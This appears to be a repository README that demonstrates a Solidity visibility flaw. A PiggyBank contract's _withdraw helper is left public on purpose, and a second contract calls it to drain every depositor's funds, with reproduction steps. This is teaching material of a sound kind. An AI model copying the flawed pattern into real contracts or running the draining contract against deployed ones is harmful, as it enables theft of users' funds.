# Internal-External-Public-vulnerability-in-smart-contracts
Example of exploiting vulnerability - bad use of internal external public in solidity smart contracts

PiggyBank is a basic smart contract allowing multiple deposits from any address, and a withdraw of all deposited funds in one transaction.
This is basic functionality and easy to understand, but...
The programmer forgot to annotate the _withdraw function of the smart contract with "internal" modificator, so any malicious actor can hack the smart contract and stole the funds.
Steps to reproduce:

1. Deploy [VulnerablePiggyBank.sol](VulnerablePiggyBank.sol) 

```csharp
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerablePiggyBank {
    mapping(address => uint) public balances;
    event WithdrawEvent(address,uint);

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public payable {
        uint balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");
        balances[msg.sender] =0;
        // Transfer balance using a reusable _withdraw function 
        _withdraw(msg.sender,balance);
    }

    //should be internal!!
    function _withdraw(address toAddress, uint balance) public {
        payable(toAddress).transfer(balance);
        emit WithdrawEvent(toAddress,balance);
    }
    
}
```

2. Do some deposits for one or more addresses. The VulnerablePiggyBank smart contract stores the funds internally, and get account of balance on every address.
 ...but before any of the participating addresses do withdraw, a malicious actor appears, doing the following steps:

3. Deploy [UsingVulnerablePiggyBank.sol](UsingVulnerablePiggyBank.sol) smart contract, that uses the vulnerable contract. When deploy, you must pass the address of VulnerablePiggyBank smart contract to constructor. That's the address of smart contract already deployed in step 1.
```csharp
contract UsingVulnerablePiggyBank {

    VulnerablePiggyBank _piggyBank;

    constructor(address piggyBank){
        _piggyBank = VulnerablePiggyBank(piggyBank);
    }
  
    function vulnerate(address to) public{
        uint etherInVulnerableContract = address(_piggyBank).balance;
        _piggyBank._withdraw(to,etherInVulnerableContract);
    }
}
```

4. The malicious actor do a transaction to call the vulnerate() function of UsingVulnerablePiggyBank smart contract, which internally calls function VulnerablePiggyBank._withdraw(), that should be "internal" and got deployed "public" by error:
5. By executing vulnerate() function, the malicious actor adquires all the funds in the vulnerable smart contract, draining the funds of all users.

  
 
    
